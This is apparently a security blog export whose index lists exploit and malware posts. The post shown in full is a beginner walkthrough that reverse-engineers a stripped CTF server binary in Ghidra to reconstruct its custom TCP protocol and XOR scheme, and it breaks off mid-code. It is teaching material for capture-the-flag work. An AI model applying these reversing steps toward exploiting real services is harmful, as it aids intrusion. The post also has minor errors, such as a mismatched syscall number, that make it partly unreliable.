{"/":{"title":"👾 KIKS.","content":"\n- [[notes/Android Deep Dive - Deep and App Linking]]\n- [[notes/Android Deep Dive - Implicit Intents]]\n- [[notes/Exploiting a Quarantine UAF Mitigation on a Custom Allocator Challenge]]\n- [[notes/A Reverse Engineering Journey Walkthrough]]\n- [[notes/DirtyCred File Exploitation applied on an io_uring UAF - CVE-2022-2602]]\n- [[notes/Linux Kernel n-day exploit development (CVE-2020-27786)]]\n- [[notes/Hunting for Linux Kernel public vulnerabilities]]\n- [[notes/KRWX - Kernel Read Write Execute]]\n- [[notes/Android Internals IPC - Binder and Service Manager Perspective]]\n- [[notes/Android Internals IPC - Introduction]]\n- [[notes/Owncloud Multiple Vulnerabilities (CSRF, SSRF and Information Leak)]]\n- [[notes/Moodle Server-Side Request Forgery (SSRF)]]\n- [[notes/TIM Mobile Phone Geolocalization]]\n- [[notes/Rusty Joomla Remote Code Execution]]\n- [[notes/How To Write FUD Malware (Thesis)]]\n\n## About\n- @kiks - VR - Trying to break stuff since ~2k16.\n- kiks.zero (at) proton.me\n- [github](https://github.com/kiks7)\n- [twitter](https://twitter.com/kiks7_7)\n\u003e This, the thrill of pwning a system, this is the greatest rush.","lastmodified":"2025-04-14T13:32:05.602086006Z","tags":null},"/Untitled":{"title":"","content":"","lastmodified":"2025-04-14T13:32:05.602086006Z","tags":null},"/notes/A-Reverse-Engineering-Journey-Walkthrough":{"title":"A Reverse Engineering Journey Walkthrough","content":"\n## Introduction\nThis blog post is about a manually Reverse Engineered challenge I have written for this year [NoHat24](https://www.nohat.it/) security conference. The conference was a blast and we also did (as [Hacktive Security](https://www.hacktivesecurity.com/)) our best to contribute also with a [worskhop](https://www.nohat.it/workshops#alessandro_groppo) on Linux Kernel Fuzzing. The challenge is a compiled C/C++ binary that implements a custom TCP protocol that can be reversed and exploited to obtain the flag. The blog post objective is to guide a beginner person with a step by step and detailed walkthrough of the whole Reverse Engineering journey, dealing with a statically compiled binary. For the best experience, it is highly suggested to download the target binary from [here TODO ](TODO) and try to replicate described steps.\n\n## The beginning of the journey\nFirst things  first, let's see what our binary is with a simple `file` command:\n\n```bash\n$ file challenge\nchallenge: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=975594a6398b8d39078294cbd2a09f100dfd6643, for GNU/Linux 3.2.0, stripped\n```\n\nWe can immediately take some notes on few things that are interesting for the reverse engineering phase: the binary is **static** (e.g. not linked with dynamic libraries) and **stripped** (e.g. no symbols). Both things will make it harder to understand the inner logic of the targeted program.\n\nAlso, the `strings` utility suggests that we are dealing with C++ too:\n```bash\n$ strings challenge | grep std\n# ...\nstd::bad_alloc\nstd::bad_array_new_length\nstd::bad_cast\nstd::bad_typeid\nstd::allocator\nstd::basic_string\nstd::string\n# ...\n```\n### First approach\nAfter having opened the binary in Ghidra and having identified its `main` function (`FUN_00405b16`) , it is possible to understand the first behaviors through logging strings:\n```C\nundefined8 FUN_00405b16(void)\n{\n  undefined4 uVar1;\n  int iVar2;\n  undefined8 uVar3;\n  long in_FS_OFFSET;\n  undefined4 local_48;\n  undefined4 local_44;\n  int local_40;\n  int local_3c;\n  undefined2 local_38;\n  undefined2 local_36;\n  undefined4 local_34;\n  undefined local_28 [24];\n  long local_10;\n  \n  local_10 = *(long *)(in_FS_OFFSET + 0x28);\n  local_40 = FUN_00524bf0(2,1,0);\n  local_48 = 1;\n  uVar1 = FUN_0051b890(0);\n  FUN_004cf660(uVar1);\n  if (local_40 \u003c 0) {\n    uVar3 = FUN_00476a40(\u0026DAT_005caba0,\"Failed to create socket\");\n    FUN_004753c0(uVar3,FUN_00476340);\n  }\n  else {\n    iVar2 = FUN_00524bb0(local_40,1,2,\u0026local_48,4);\n    if (iVar2 \u003c 0) {\n      uVar3 = FUN_00476a40(\u0026DAT_005caba0,\"Failed to setsockopt on socket\");\n      FUN_004753c0(uVar3,FUN_00476340);\n    }\n    else {\n      thunk_FUN_004ef5e0(\u0026local_38,0,0x10);\n      local_38 = 2;\n      local_34 = 0;\n      local_36 = FUN_005257d0(0x51);\n      iVar2 = FUN_005249d0(local_40,\u0026local_38,0x10);\n      if (iVar2 \u003c 0) {\n        uVar3 = FUN_00476a40(\u0026DAT_005caba0,\"Bind failed\");\n        FUN_004753c0(uVar3,FUN_00476340);\n        FUN_005216a0(local_40);\n      }\n      else {\n        iVar2 = FUN_00524a00(local_40,5);\n        if (-1 \u003c iVar2) {\n          uVar3 = FUN_00476a40(\u0026DAT_005cacc0,\"Server listening..\");\n          FUN_004753c0(uVar3,FUN_00476340);\n          do {\n            while( true ) {\n              local_44 = 0x10;\n              local_3c = FUN_00524930(local_40,local_28,\u0026local_44);\n              if (-1 \u003c local_3c) break;\n              uVar3 = FUN_00476a40(\u0026DAT_005caba0,\"Accept failed\");\n              FUN_004753c0(uVar3,FUN_00476340);\n            }\n            uVar3 = FUN_00476a40(\u0026DAT_005cacc0,\"Connection accepted\");\n            FUN_004753c0(uVar3,FUN_00476340);\n            FUN_0040597c(local_3c);\n            FUN_005216a0(local_3c);\n          } while( true );\n        }\n        uVar3 = FUN_00476a40(\u0026DAT_005caba0,\"Listen failed\");\n        FUN_004753c0(uVar3,FUN_00476340);\n        FUN_005216a0(local_40);\n      }\n    }\n  }\n  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {\n                    /* WARNING: Subroutine does not return */\n    FUN_005256e0();\n  }\n  return 1;\n}\n```\n\nSince the binary is statically linked and stripped, common libc functions do not have explicit names and needs to be reconstructed. To perform such operation, strings can be used to guess the function name and can be confirmed through a more reliable method: go to the function definition and extract the `eax` register used in the `syscall` instruction. For example, the function `FUN_00524930` can be guessed as an `accept` syscall through the `Accept failed` log message (hence, the `FUN_00476a40` is something log related) and confirmed with its assembly, where `0x2d` corresponds to the `accept` syscall ([Linux kernel syscall tables](https://syscalls.mebeim.net/?table=x86/64/x64/v6.7)):\n\n```asm\n0052493d: MOV EAX,0x2b\n00524942: SYSCALL\n```\n\n Also, the first accepted parameter of the `accept` syscall is a `socket` file descriptor and can be used to identify the `socket` call at `FUN_00524bf0` since the returned value is assigned into the `local_40` variable.\n\n```C\n\nundefined8 main(void)\n\n{\n  undefined4 uVar1;\n  int iVar2;\n  undefined8 uVar3;\n  long in_FS_OFFSET;\n  undefined4 local_48;\n  undefined4 local_44;\n  int socket;\n  int sock_accept;\n  undefined2 local_38;\n  undefined2 local_36;\n  undefined4 local_34;\n  undefined local_28 [24];\n  long stack_cookie;\n  \n  stack_cookie = *(long *)(in_FS_OFFSET + 0x28);\n  socket = ::socket(2,1,0);\n  local_48 = 1;\n  uVar1 = FUN_0051b890(0);\n  FUN_004cf660(uVar1);\n  if (socket \u003c 0) {\n    uVar3 = may_log(\u0026DAT_005caba0,\"Failed to create socket\");\n    jmp_rsi(uVar3,FUN_00476340);\n  }\n  else {\n    iVar2 = FUN_00524bb0(socket,1,2,\u0026local_48,4);\n    if (iVar2 \u003c 0) {\n      uVar3 = may_log(\u0026DAT_005caba0,\"Failed to setsockopt on socket\");\n      jmp_rsi(uVar3,FUN_00476340);\n    }\n    else {\n      thunk_FUN_004ef5e0(\u0026local_38,0,0x10);\n      local_38 = 2;\n      local_34 = 0;\n      local_36 = FUN_005257d0(0x51);\n      iVar2 = bind(socket,\u0026local_38,0x10);\n      if (iVar2 \u003c 0) {\n        uVar3 = may_log(\u0026DAT_005caba0,\"Bind failed\");\n        jmp_rsi(uVar3,FUN_00476340);\n        close(socket);\n      }\n      else {\n        iVar2 = listen(socket,5);\n        if (-1 \u003c iVar2) {\n          uVar3 = may_log(\u0026DAT_005cacc0,\"Server listening..\");\n          jmp_rsi(uVar3,FUN_00476340);\n          do {\n            while( true ) {\n              local_44 = 0x10;\n              sock_accept = accept(socket,local_28,\u0026local_44);\n              if (-1 \u003c sock_accept) break;\n              uVar3 = may_log(\u0026DAT_005caba0,\"Accept failed\");\n              jmp_rsi(uVar3,FUN_00476340);\n            }\n            uVar3 = may_log(\u0026DAT_005cacc0,\"Connection accepted\");\n            jmp_rsi(uVar3,FUN_00476340);\n            FUN_0040597c(sock_accept);\n            close(sock_accept);\n          } while( true );\n        }\n        uVar3 = may_log(\u0026DAT_005caba0,\"Listen failed\");\n        jmp_rsi(uVar3,FUN_00476340);\n        close(socket);\n      }\n    }\n  }\n  if (stack_cookie != *(long *)(in_FS_OFFSET + 0x28)) {\n                    /* WARNING: Subroutine does not return */\n    __stack_check();\n  }\n  return 1;\n}\n```\n\nBy applying these techniques on the entire `main` function, we can obtain a much more cleaner code and identify two key parts:\n- The server uses an `AF_INET` socket and binds to port `81` (`\u0026local_38` is a `struct sockaddr *`). The `81` port can be quickly identified, without a proper cast, through the `local_36` variable that is instead an offset of the `local_38` stack variable.\n- The file descriptor returned from the `accept` syscall (the client connection) is parsed through the `FUN_0040597c` function that can be renamed, for that reason, to `parse_client_message`.\n\n### Parse client message\n```C\nvoid parse_client_message(int socket)\n\n{\n  char cVar1;\n  int iVar2;\n  undefined8 uVar3;\n  long in_FS_OFFSET;\n  undefined local_228 [4];\n  char local_224;\n  ushort local_222;\n  undefined local_118 [264];\n  long local_10;\n  \n  local_10 = *(long *)(in_FS_OFFSET + 0x28);\n  thunk_FUN_004ef5e0(local_118,0,0x108);\n  iVar2 = FUN_00524a30(socket,local_118,0x108,0);\n  if (iVar2 \u003c 0) {\n    uVar3 = may_log(\u0026DAT_005caba0,\"Error reading from socket\");\n    jmp_rsi(uVar3,FUN_00476340);\n    close(socket);\n  }\n  else {\n    FUN_00405f5e(local_228);\n    cVar1 = FUN_00405f8e(local_228,local_118,(long)iVar2);\n    if (cVar1 == '\\x01') {\n      FUN_00406018(local_228);\n      if (local_224 == 0x10) {\n        FUN_00405453(local_228);\n      }\n      else if (local_224 == 0x20) {\n        FUN_00405520(local_228);\n      }\n      else {\n        local_222 = 0;\n      }\n      FUN_00524af0(socket,local_228,(ulong)local_222 + 8,1);\n    }\n    else {\n      uVar3 = may_log(\u0026DAT_005caba0,\"Invalid message received\");\n      jmp_rsi(uVar3,FUN_00476340);\n    }\n  }\n  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {\n                    /* WARNING: Subroutine does not return */\n    __stack_check();\n  }\n  return;\n}\n```\n\nThe newly identified `parse_client_message` function seems to do what we have guessed: parse a message received from the client (`Error reading from socket` where `FUN_00524a30` is `recvfrom`) and perform some validation (e.g. `Invalid message received`).\nBy applying the same techniques previously described we can make further assumptions:\n- `local_118` is the second parameter of the `recvfrom` syscall. Since the second parameter of `recvfrom` is a `char*` buffer we can safely rename it to `buffer` and change its type (using the Ghidra `Retype Variable`) to `char[256]`.\n- The `FUN_00405f5e` seems to init a structure (or object since we are dealing with C++) inside the `undefined` stack variable `local_228` (now renamed to `undefined_obj`). \n- The just initialized `undefined_obj` is used as the first parameter to the function `FUN_00405f8e` that accepts two more parameters: the `buffer` passed to the `recvfrom` and its returned result (e.g. number of received bytes) through the local `iVar3` (renamed to `bytes_received`). We can use these information to retype the targeted function signature with appropriate parameter types.\n\n### Initialize an undefied object\n```C\nundefined8 FUN_00405f8e(undefined8 *undefined_obj,char *buffer,ulong param_3)\n\n{\n  undefined8 uVar1;\n  \n  if (param_3 \u003c 8) {\n    uVar1 = 0;\n  }\n  else {\n    *undefined_obj = *(undefined8 *)buffer;\n    if (*(short *)undefined_obj == -0x9a) {\n      if (*(ushort *)((long)undefined_obj + 6) \u003c 0x101) {\n        thunk_FUN_004ef2e0(undefined_obj + 1,buffer + 8,*(short *)((long)undefined_obj + 6));\n        uVar1 = 1;\n      }\n      else {\n        uVar1 = 0;\n      }\n    }\n    else {\n      uVar1 = 0;\n    }\n  }\n  return uVar1;\n}\n```\n\nFunction `FUN_00405f8e` first checks that `param_3` is more than `8` bytes and returns `0` otherwise. \nThe first `if` condition is misleading through the decompiled code, but much more clear from the assembly instruction: `CMP AX, 0xff66`. We are checking that the first bytes of the received buffer contains the `0xff66` constant (some sort of a magic value?)  and returning `0` if not. The next conditional statement is checking 2 bytes (deduced from the `ushort` cast of the offset access and confirmed from the `AX` usage inside `CMP AX,0x100`). If the extracted value at offset `0x6` is below `0x101` (256 in decimal, a classic buffer size :}) we continue with a weird call to `thunk_FUN_004ef2e0` and we set the return result (`uVar1` now renamed to `ret`) to 1. \n\nThe `thunk_FUN_004ef2e0` function is not that straightforward to understand and can be statically identified by deeply reversing the function or dynamically using a debugger and verifying its behavior. It is accepting three parameters:\n1. `undefined_obj + 1` where the `+1` is not properly \"correct\". Since we are presumably dealing with an object, it should be treated as a `void*`. By re-typing the value to a more appropriate type, it become `undefined_obj + 8` as the assembly instruction.\n2. `buffer + 8` that is the same offset as the first parameter.\n3. `undefined_obj + 6` that has been previously discussed and could be some sort of size (due to the `256` constant).\n\nIt seems that the first 2 parameters are some sort of source and destination (also dealing with the same offset) and the last parameter a size. Is it a `memcpy`? A quick session with `gdb` actually reveals that the behavior, and the function signature, match the `memcpy` function call. Nice!\n\n### Scratching the structure definition\nWith these first hints, we can perform some asssumptions:\n1. First bytes of the received buffer should contains a magic value `0xff66` that corresponds to 2 bytes (16 bits).\n2. At offset `0x6` we should have a size related field of 2 bytes (remember the previous `CMP, 0x100` instruction and the `memcpy` parameter).\n3. Starting from offset `0x8`, we are copying the entire buffer, for a maximum of `256` bytes, inside our undefined object.\n\nWith that information, we can start creating a potential structure from `Data Type Manager` =\u003e `Data Types` =\u003e `challenge` =\u003e `New` =\u003e `Structure`:\n\n![[notes/images/rev/1.png]]\n\nAfter the creation of the new structure and the retype of the `undefined_obj`, we have a much cleaner and easier to understand function (renamed into `copy_from_buffer`). Also, we can retype the same value from the caller function and all subsequent calls.\n\n```C\nundefined8 copy_from_buffer(struct custom_message *undefined_obj,char *buffer,ulong param_3)\n\n{\n  undefined8 buffer_ptr;\n  \n  if (param_3 \u003c 8) {\n    buffer_ptr = 0;\n  }\n  else {\n    buffer_ptr = *(undefined8 *)buffer;\n    undefined_obj-\u003emagic = (short)buffer_ptr;\n    undefined_obj-\u003eundefined[0] = (char)((ulong)buffer_ptr \u003e\u003e 0x10);\n    undefined_obj-\u003eundefined[1] = (char)((ulong)buffer_ptr \u003e\u003e 0x18);\n    undefined_obj-\u003eundefined[2] = (char)((ulong)buffer_ptr \u003e\u003e 0x20);\n    undefined_obj-\u003eundefined[3] = (char)((ulong)buffer_ptr \u003e\u003e 0x28);\n    undefined_obj-\u003esize = (short)((ulong)buffer_ptr \u003e\u003e 0x30);\n    if (undefined_obj-\u003emagic == 0xff66) {\n      if (undefined_obj-\u003esize \u003c 0x101) {\n        memcpy(undefined_obj-\u003epayload,buffer + 8,undefined_obj-\u003esize);\n        buffer_ptr = 1;\n      }\n      else {\n        buffer_ptr = 0;\n      }\n    }\n    else {\n      buffer_ptr = 0;\n    }\n  }\n  return buffer_ptr;\n}\n```\n**Note:** `buffer_ptr` is a rename to make it easier to read the code after the `else` statement. However, it is also used form the same routine as the return result variable. For that reason, it is returning `buffer_ptr` but instead it is `0` or `1`.\n\n### More parsing\nComing back to the renamed `parse_client_message`, a conditional statement verifies the content of `undefined_obj.undefined[2]` against `0x10` or `0x20`. If it doesn't match any of these two values, it will set the `size` object value to 0 and continue the execution. The execution, shared also with the two conditional cases, goes directly into a `sendto` syscall (renamed from `FUN_00524af0`):\n```C\nsendto(socket,\u0026undefined_obj,(ulong)undefined_obj.size + 8,0);\n```\n\nThe sent buffer is the same object we are analyzing and the number of bytes to be sent through the `sendto` syscall (third parameter) is the `undefined_obj.size` previously set to zero plus `0x8`.\n\nIf the condition matches `0x10` the routine calls `FUN_00405453` or `FUN_00405520` if it matches `0x20` and they both accept the address of the `undefined_obj` as a parameter. Also, from that condition, we can continue to add information on our structure. We are accessing the byte (due to the `MOVZXZ EAX, AL` before the `CMP` instruction) at offset `0x2` of the `undefined` member.  We can add a member on our `struct custom_message` with the name of `command`, since it seems to redirect the execution based on its value, and put a size of `uint8_t` due to the `AL` register access and the comparison of the two hexadecimal values:\n\n![[notes/images/rev/2.png]]\n\n### Command 0x10\nWe can rename `FUN_00405453` to `command_0x10` and `FUN_00405520` to `command_0x20`. This is useful to simplify further references.\n\n```C\nvoid command_0x10(struct custom_message *obj)\n{\n  int iVar1;\n  ushort *puVar2;\n  byte bVar3;\n  long in_FS_OFFSET;\n  ushort local_22;\n  long stack_cookie;\n  \n  stack_cookie = *(long *)(in_FS_OFFSET + 0x28);\n  local_22 = *(ushort *)obj-\u003eundefined;\n  if ((local_22 \u003c 0x100) || (0x900 \u003c local_22)) {\n    obj-\u003esize = 0;\n  }\n  else {\n    iVar1 = FUN_004cf650();\n    bVar3 = (char)iVar1 + (char)(iVar1 / 0x3f) * -0x3f;\n    puVar2 = (ushort *)FUN_004060a8(\u0026DAT_005c9d80,\u0026local_22);\n    *puVar2 = (ushort)bVar3;\n    obj-\u003esize = 2;\n    obj-\u003epayload[0] = '\\x01';\n    obj-\u003epayload[1] = bVar3;\n  }\n  if (stack_cookie != *(long *)(in_FS_OFFSET + 0x28)) {\n                    /* WARNING: Subroutine does not return */\n    __stack_check();\n  }\n  return;\n}\n```\n\nThe first thing we can see, after having retyped the parameter into `struct custom_message*`, as observed from the caller, is the dereference of `obj-\u003eundefined` as a `ushort` (2 bytes). The first validation is that that value is between `0x100` and `0x900`, otherwise we return while setting the object size to `0x0`. If the validation step is valid the things become more confusing:\n1. The result of `FUN_004cf650` (`iVar1`) is divided by `0x3f` and summed with itself, then multiplied with `0x3f` (=\u003e`bVar3`) and the result is stored in the pointer returned from `FUN_004060a8`.\n2.  `FUN_004060a8` involves two parameters: a global variable (due to its `.bss` section location)  `DAT_005c9d8` and the byte extracted from `obj-\u003eundefined` as the second parameter. \n\nThe `DAT_005c9d8` address, by seeing its references, is also used in the function `command_0x20` but in the opposite way: instead of storing a value inside the returned pointer, it retrieves it, always using the `obj-\u003eundefined` member of our declared structure. Since the internals of the `FUN_004060a8` are pretty confusing, let's superficially rename the function  into a generic `store_and_get` and proceed the analysis. After storing the calculated value, the object parameter is directly modified: its `size` to `0x2`, `payload[0]` to `0x1` and `obj-\u003epayload[1]` with the calculated value. By seeing the `payload` access we can suppose that we have two more `byte` members instead of the remaining `char`. A weird thing is that now the `structure-\u003epayload` become `char[254]`, a weird size for a payload, but that's what we are observing. Since we know the logic behind the second parameter, we can rename its newly created member at that offset with `calculated_value`, leaving the other one with an undefined logic with `undefined_3`.\n\n![[notes/images/rev/3.png]]\n\nAfter returning to `parse_client_message`, as observed before, the modified object is sent back to the client. That means that the same object as input is used as output for the client socket.\n\n### Command 0x20\nIf `undefined_obj.command`, in `parse_client_message`, contains `0x20` instead, the function `command_0x20` is called:\n```C\nvoid command_0x20(struct custom_message *obj)\n{\n  byte bVar1;\n  char cVar2;\n  int iVar3;\n  undefined2 *puVar4;\n  undefined8 uVar5;\n  long in_FS_OFFSET;\n  undefined2 local_168;\n  ushort local_166;\n  int local_164;\n  int local_160;\n  int local_15c;\n  int local_158;\n  int local_154;\n  int local_150;\n  undefined4 local_14c;\n  undefined4 local_148;\n  int local_144;\n  long local_140;\n  undefined local_138 [16];\n  undefined8 local_128;\n  long local_10;\n  \n  local_10 = *(long *)(in_FS_OFFSET + 0x28);\n  local_168 = *(undefined2 *)obj-\u003eundefined;\n  puVar4 = (undefined2 *)store_and_get(\u0026DAT_005c9d80,\u0026local_168);\n  bVar1 = (byte)*puVar4;\n  if (bVar1 == 0) {\n    obj-\u003esize = 0;\n  }\n  else {\n    local_14c = 3;\n    local_138 = (undefined  [16])0x0;\n    local_128 = 0;\n    local_166 = 0;\n    local_164 = 0;\n    local_140 = 0;\n    local_160 = 0;\n    local_15c = 0;\n    while ((((local_15c \u003c 3 \u0026\u0026\n             (local_166 = (ushort)obj-\u003epayload[(long)local_164 + -2],\n             (int)(uint)local_166 \u003c= 0xff - local_164)) \u0026\u0026 (local_166 \u003c obj-\u003esize)) \u0026\u0026\n           (local_166 != 0))) {\n      local_140 = FUN_004ed140(local_166 + 1);\n      *(undefined *)(local_140 + (ulong)local_166) = 0;\n      memcpy(local_140,obj-\u003epayload + (long)local_164 + -1,local_166);\n      for (local_158 = 0; local_158 \u003c (int)(uint)local_166; local_158 = local_158 + 1) {\n        *(byte *)(local_140 + local_158) = *(byte *)(local_140 + local_158) ^ bVar1;\n      }\n      *(long *)(local_138 + (long)local_15c * 8) = local_140;\n      local_160 = local_160 + 1;\n      local_164 = local_164 + local_166 + 1;\n      local_15c = local_15c + 1;\n    }\n    if (local_160 \u003c 2) {\n      obj-\u003esize = 0;\n    }\n    else {\n      local_154 = 0;\n      iVar3 = thunk_FUN_004ef8a0(local_138._0_8_,\u0026DAT_00568030);\n      if (iVar3 == 0) {\n        local_154 = 0x40;\n      }\n      iVar3 = thunk_FUN_004ef8a0(local_138._0_8_,\u0026DAT_00568035);\n      if (iVar3 == 0) {\n        local_154 = 0x41;\n      }\n      iVar3 = thunk_FUN_004ef8a0(local_138._0_8_,\"write\");\n      if (iVar3 == 0) {\n        local_154 = 0x42;\n      }\n      local_148 = 0;\n      if (local_154 == 0x42) {\n        uVar5 = may_log(\u0026DAT_005cacc0,\"EXEC_WRITE Not implemented\");\n        jmp_rsi(uVar5,FUN_00476340);\n      }\n      else if (local_154 \u003c 0x43) {\n        if (local_154 == 0x40) {\n          obj-\u003esize = 1;\n          cVar2 = FUN_00405355(local_138._8_8_);\n          if (cVar2 == '\\x01') {\n            obj-\u003eundefined_3 = 1;\n          }\n          else {\n            obj-\u003eundefined_3 = 0;\n          }\n        }\n        else if (local_154 == 0x41) {\n          if (local_160 == 3) {\n            local_148 = FUN_004ce310(local_128);\n            local_144 = FUN_004053be(\u0026obj-\u003eundefined_3,local_138._8_8_,local_148);\n            if (local_144 == 0) {\n              obj-\u003esize = 0;\n            }\n            else {\n              obj-\u003esize = (uint16_t)local_144;\n              for (local_150 = 0; local_150 \u003c local_144; local_150 = local_150 + 1) {\n                obj-\u003epayload[(long)local_150 + -2] = obj-\u003epayload[(long)local_150 + -2] ^ bVar1;\n              }\n            }\n          }\n          else {\n            obj-\u003esize = 0;\n          }\n        }\n      }\n    }\n  }\n  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {\n    return;\n  }\n                    /* WARNING: Subroutine does not return */\n  __stack_check();\n}\n```\n\nIn this case, we are dealing with a much longer function. `store_and_get` function is the first one that is called and retrieve its value, maybe based on the `obj-\u003eundefined` value. We can then rename `pVar1` with `stored_value` and we can see that if it is `0x0`, the function sets `obj-\u003esize` to `0x0` and return, a common pattern also identified previously that seems to be related to some sort of failure in the message validation process. That means that the `store_and_get` function must return something to proceed (**hence we need to first call `command_0x10` to set it?**).\n\n#### The tedious while loop\nThe first while loop inside the `command_0x20` seems like one of the first main blocks of the function and contains a pretty confusing condition, let's cut it down: \n\n```C\nlocal_164 = 0;\nlocal_15c = 0;    \nwhile (\n\t(\n\t\t(\n\t\t\t(local_15c \u003c 3 \u0026\u0026\n\t\t\t(local_166 = obj-\u003epayload[local_164 - 2], local_166 \u003c= 0xff - local_164)) \u0026\u0026 \n\t\t\t(local_166 \u003c obj-\u003esize)\n\t\t)\n\t\t  \u0026\u0026\n\t   (local_166 != 0))\n) {\n  // ..\n  memcpy(local_140,obj-\u003epayload + (long)local_164 + -1,local_166);\n  local_164 = local_164 + local_166 + 1;\n  local_15c = local_15c + 1;\n}\n```\n\nStep by step:\n1. `local_15c` is zero initialized, incremented inside the loop and checked if it is less than `3`. It is clearly an `index` that tells us that it will loop through the cycle at least 3 times. Let's rename it to `idx`.\n2. `local_166` is assigned to  `obj-\u003epayload[local_164 - 2]`, where `local_164` is first initialized with 0 and then incremented with `1` and the value of `local_166` inside the loop.  `local_166` is later used as the size parameter of the `memcpy` function, while `local_164` as an offset to `obj_payload` as the source argument.\n\t1. Since the two local variables are pretty confusing, let's start renaming things into something more easy to read with the limited information we have gathered: `memcpy_size` and `memcpy_source_offset`.\n\n```C\nmemcpy_source_offset = 0;\nlocal_15c = 0;    \nwhile (\n\t(\n\t\t(\n\t\t\t(local_15c \u003c 3 \u0026\u0026\n\t\t\t(memcpy_size = obj-\u003epayload[memcpy_source_offset - 2], memcpy_size \u003c= 0xff - memcpy_source_offset)) \u0026\u0026 \n\t\t\t(memcpy_size \u003c obj-\u003esize)\n\t\t)\n\t\t  \u0026\u0026\n\t   (memcpy_size != 0))\n) {\n  // ..\n  memcpy(local_140,obj-\u003epayload + (long)memcpy_source_offset + -1,memcpy_size);\n  memcpy_source_offset = memcpy_source_offset + memcpy_size + 1;\n  local_15c = local_15c + 1;\n}\n```\n\nNow we can use more meaningful names and things are more clear:\n\n3. `memcpy_size` is retrieved at each loop through an offset (`memcpy_source_offset`) inside the `obj-\u003epayload`. Given these two variables, the content of `obj-\u003epayload` is copied inside the `local_140` variable (dynamic parsing).\n\t- Also, `memcpy_size` must not be zero or more than `0xff - memcpy_source_offset` to continue the loop.\n\nLet's see more code to understand the entire loop process:\n```C\nlocal_138 = (undefined  [16])0x0;\nwhile ((((idx \u003c 3 \u0026\u0026\n\t\t (memcpy_size = (ushort)obj-\u003epayload[(long)memcpy_source_offset + -2],\n\t\t (int)(uint)memcpy_size \u003c= 0xff - memcpy_source_offset)) \u0026\u0026 (memcpy_size \u003c obj-\u003esize))\n\t   \u0026\u0026 (memcpy_size != 0))) {\n  local_140 = FUN_004ed140(memcpy_size + 1);\n  *(undefined *)(local_140 + (ulong)memcpy_size) = 0;\n  memcpy(local_140,obj-\u003epayload + (long)memcpy_source_offset + -1,memcpy_size);\n  for (local_158 = 0; local_158 \u003c (int)(uint)memcpy_size; local_158 = local_158 + 1) {\n\t*(byte *)(local_140 + local_158) = *(byte *)(local_140 + local_158) ^ bVar1;\n  }\n  *(long *)(local_138 + (long)idx * 8) = local_140;\n  local_160 = local_160 + 1;\n  memcpy_source_offset = memcpy_source_offset + memcpy_size + 1;\n  idx = idx + 1;\n}\n```\n\n4. `local_140` is assigned with the result of the `FUN_004ed140` with the `memcpy_size` as the parameter. Identify this function is easy as just open the function and see the error log with `\"malloc.c\",0xd17,\"__libc_malloc\"` on it. We can rename it to `malloc` and know that `local_140` holds a pointer to an allocated memory.\n\t1. We put a `0x0` value at the offset of `memcpy_size`. Maybe the NULL character at the end of the string.\n5. `local_140` is used as the destination of the previously described `memcpy` (renamed it to `memcpy_dest`).\n6. The next `for` loop iterates on each character copied inside the `memcpy_dest` pointer using `local_158` as an index (renamed to `inner_idx`) and XOR its with `stored_value`.\n\t1. Here we go! We have found how `stored_value` is used and we can rename it to `xor_key`. We can also rename the `obj-\u003eundefined` into something like `xor_key_derivate` since it is used to derive in some way (through the `store_and_get` function) the XOR key.\n7. Just after the `for` loop we have an assignment of the pointer `local_140` (now `memcpy_dest`) to `local_138` with the `idx` index multiplied by 8.  We can retype the `local_140` array (declared from ghidra as `undefined local_138 [16];`) into a `char*` for that reasons (and rename it into `char_ptr_array`):\n\t2. We are storing a pointer into each slot (the multiplication of 8 is the size of each entry e.g. the pointer size)\n\t3. We were NULL terminating the memory. That means that we are dealing with some sort of string parsing.\n8. Furthemore, `local_160` is incremented by 1 at each iteration and later checked against 2 (if it is less we return with `obj-\u003esize = 0`) and later again inside another loop. We don't know the context of it but at least know that, in order to continue the function flow, we need to iterate the loop at least 2 times. With poor fantasy, let's rename it `at_least_2`.\n\nFinally, the loop is far more readable:\n```C\nlocal_14c = 3;\nchar_ptr_array[0] = (char *)0x0;\nchar_ptr_array[1] = (char *)0x0;\nchar_ptr_array[2] = (char *)0x0;\nmemcpy_size = 0;\nmemcpy_source_offset = 0;\nmemcpy_dest = (char *)0x0;\nat_least_2 = 0;\nidx = 0;\nwhile ((((idx \u003c 3 \u0026\u0026\n\t\t (memcpy_size = (ushort)obj-\u003epayload[(long)memcpy_source_offset + -2],\n\t\t (int)(uint)memcpy_size \u003c= 0xff - memcpy_source_offset)) \u0026\u0026 (memcpy_size \u003c obj-\u003esize))\n\t   \u0026\u0026 (memcpy_size != 0))) {\n  memcpy_dest = (char *)malloc(memcpy_size + 1);\n  memcpy_dest[memcpy_size] = '\\0';\n  memcpy(memcpy_dest,obj-\u003epayload + (long)memcpy_source_offset + -1,memcpy_size);\n  for (inner_idx = 0; inner_idx \u003c (int)(uint)memcpy_size; inner_idx = inner_idx + 1) {\n\tmemcpy_dest[inner_idx] = memcpy_dest[inner_idx] ^ stored_value;\n  }\n  char_ptr_array[idx] = memcpy_dest;\n  at_least_2 = at_least_2 + 1;\n  memcpy_source_offset = memcpy_source_offset + memcpy_size + 1;\n  idx = idx + 1;\n}\n```\n#### More parsing\nTo summarize the previous loop, we have seen the parsing of the client message by splitting it into multiple \"chunks\" based on the message specified size (`memcpy_size` retrieved, and validated, directly from the message) and storing them inside a `char*` array: `char_ptr_array`. Let's continue our journey.\n\n```C\nif (at_least_2 \u003c 2) {\n  obj-\u003esize = 0;\n}\nelse {\n  local_154 = 0;\n  iVar3 = thunk_FUN_004ef8a0(char_ptr_array[0],\u0026DAT_00568030);\n  if (iVar3 == 0) {\n\tlocal_154 = 0x40;\n  }\n  iVar3 = thunk_FUN_004ef8a0(char_ptr_array[0],\u0026DAT_00568035);\n  if (iVar3 == 0) {\n\tlocal_154 = 0x41;\n  }\n  iVar3 = thunk_FUN_004ef8a0(char_ptr_array[0],\"write\");\n  if (iVar3 == 0) {\n\tlocal_154 = 0x42;\n  }\n\tlocal_148 = 0;\n  if (local_154 == 0x42) {\n\tuVar5 = may_log(\u0026DAT_005cacc0,\"EXEC_WRITE Not implemented\");\n\tjmp_rsi(uVar5,FUN_00476340);\n  }\n  else if (local_154 \u003c 0x43) {\n\tif (local_154 == 0x40) {\n\t  obj-\u003esize = 1;\n\t  cVar2 = 